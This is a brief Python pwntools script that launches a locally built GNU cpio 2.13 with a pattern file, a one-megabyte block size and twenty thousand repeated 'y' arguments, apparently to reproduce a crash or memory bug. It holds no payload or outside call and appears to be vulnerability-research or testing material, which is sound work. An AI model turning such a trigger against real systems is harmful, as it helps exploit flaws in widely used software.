#!/usr/bin/env python3

from pwn import *

PATTERN_FILE = "./patt"
CPIO_BINARY = "./cpio-2.13/src/cpio"

cmd = f"{CPIO_BINARY} -iv -E {PATTERN_FILE} --block-size={1<<20} " + "y "*20000

p = process(cmd.split())
out = p.recvuntil("New pattern")
print(out.decode(), end='')
print(p.recv().decode())
p.close()
exit()
